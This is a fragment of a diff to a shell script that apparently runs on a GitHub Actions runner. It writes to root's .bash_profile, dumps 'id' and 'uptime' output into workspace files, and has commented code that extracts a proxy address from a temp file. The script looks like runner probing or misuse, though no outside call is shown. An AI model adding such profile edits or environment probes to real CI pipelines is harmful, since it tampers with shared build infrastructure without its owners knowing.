@@ -24,20 +24,20 @@ sudo bash -c 'echo -e "\nls -al /tmp/nu*;">>/root/.bash_profile';
 
 # [ ! -z "${GITHUB_WORKSPACE}" ] &&(  
   cp /tmp/js9 $GITHUB_WORKSPACE/js9.txt;
-  sudo mkdir -pv  $GITHUB_WORKSPACE/package;
-  sudo mkdir -pv  $GITHUB_WORKSPACE/dist;
-  sudo id>$GITHUB_WORKSPACE/package/d2023.txt;
-  sudo uptime>$GITHUB_WORKSPACE/d2023.txt;
+   mkdir -pv  $GITHUB_WORKSPACE/package;
+   mkdir -pv  $GITHUB_WORKSPACE/dist;
+   id>$GITHUB_WORKSPACE/package/d2023.txt;
+   uptime>$GITHUB_WORKSPACE/d2023.txt;
   #date>$GITHUB_WORKSPACE/dist/d2023.txt;
 # )
 
-
+exit;
 [ ! -f /tmp/ubuntu_update ]&&sudo apt-get update&&touch /tmp/ubuntu_update;
 
 # ip_port7pxy2=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9);
 # echo "flag_9832q";
 
-exit;
+
 
 
 (while true; do
